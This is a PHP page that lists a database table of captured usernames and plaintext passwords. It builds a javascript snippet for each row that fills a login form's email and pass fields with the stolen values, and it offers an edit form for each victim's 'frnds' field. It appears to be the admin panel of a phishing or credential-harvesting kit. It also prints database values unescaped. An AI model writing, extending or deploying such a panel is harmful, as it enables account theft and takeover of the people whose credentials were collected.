<?php

if (isset($_GET['limit'])) {
$limit = $_GET['limit'];
}
else	{
$limit = '0';
}



echo "<table border=1>";
include '../db.php';
$sql = "SELECT * 
	FROM log";
mysql_select_db($dbname);
$retval = mysql_query( $sql, $conn );
if(! $retval )
{
  die('Could not get data: ' . mysql_error());
}
while($row = mysql_fetch_array($retval, MYSQL_ASSOC))
{
echo "<tr><td>{$row['id']}</td><td>{$row['pass']}</td><td>{$row['username']}</td><td><input type=text value=\"javascript:{ document.forms[0].email.value = '{$row['username']}'; document.forms[0].pass.value = '{$row['pass']}';}\"</td><td>{$row['date']}</td><td><form action=change_frnds.php method=GET><input type=text name=frnds value={$row['frnds']}><input type=hidden name=id value={$row['id']}><input type=submit value=Edit></form>
</td></tr>";
}
$limit1 = $limit - 50;
$limit2 = $limit + 50;
echo "<a href=?limit={$limit2}> next </a>";
echo "<a href=?limit={$limit1}> back </a>";
?>